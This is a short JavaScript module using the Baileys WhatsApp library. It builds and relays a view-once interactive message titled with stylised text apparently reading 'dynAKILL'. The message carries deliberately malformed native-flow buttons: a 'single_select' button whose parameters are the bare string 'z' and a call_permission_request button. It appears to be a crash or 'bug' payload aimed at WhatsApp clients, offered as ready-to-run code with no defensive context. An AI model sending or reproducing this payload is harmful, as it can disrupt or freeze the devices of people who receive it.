
import pkg from '@whiskeysockets/baileys';

const { proto, generateWAMessageFromContent } = pkg;

export async function test(message, client) {

    const target = message.key.remoteJid;

    console.log("Sending")

     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await client.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });

            console.log("Document")
}
 
export default test;
